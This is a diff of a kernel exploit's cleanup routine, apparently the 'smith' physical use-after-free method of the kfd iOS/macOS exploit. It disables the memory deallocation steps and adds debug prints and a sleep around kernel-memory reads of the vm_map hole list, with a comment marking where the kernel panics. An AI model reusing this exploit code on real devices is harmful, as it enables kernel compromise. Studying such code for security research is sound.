@@ -142,29 +142,29 @@ void smith_cleanup(struct kfd* kfd)
 {
     smith_helper_cleanup(kfd);
 
-    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
-    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
-    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
-
-    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
-    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);
-
-    vm_address_t address1 = smith->vme[0].address;
-    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
-    assert_mach(vm_deallocate(mach_task_self(), address1, size1));
-
-    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
-    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
-    assert_mach(vm_deallocate(mach_task_self(), address2, size2));
-
-    /*
-     * No middle block if the kread and kwrite pages are the same or back-to-back.
-     */
-    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
-        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
-        vm_size_t size3 = (max_puaf_page_uaddr - address3);
-        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
-    }
+//    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
+//    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
+//    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
+//
+//    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
+//    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);
+//
+//    vm_address_t address1 = smith->vme[0].address;
+//    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
+//    assert_mach(vm_deallocate(mach_task_self(), address1, size1));
+//
+//    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
+//    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
+//    assert_mach(vm_deallocate(mach_task_self(), address2, size2));
+//
+//    /*
+//     * No middle block if the kread and kwrite pages are the same or back-to-back.
+//     */
+//    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
+//        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
+//        vm_size_t size3 = (max_puaf_page_uaddr - address3);
+//        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
+//    }
 }
 
 /*
@@ -550,10 +550,12 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 second_leaked_hole_next = 0;
 
         while (true) {
+            print_message("Scan hole list: %llu", hole_count);
             hole_count++;
             u64 hole_next = kget_u64(vm_map_entry__links__next, hole_kaddr);
+            usleep(100);
             u64 hole_start = kget_u64(vm_map_entry__links__start, hole_kaddr);
-            u64 hole_end = kget_u64(vm_map_entry__links__end, hole_kaddr);
+            u64 hole_end = kget_u64(vm_map_entry__links__end, hole_kaddr); // panics here
 
             if (hole_start == 0) {
                 first_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
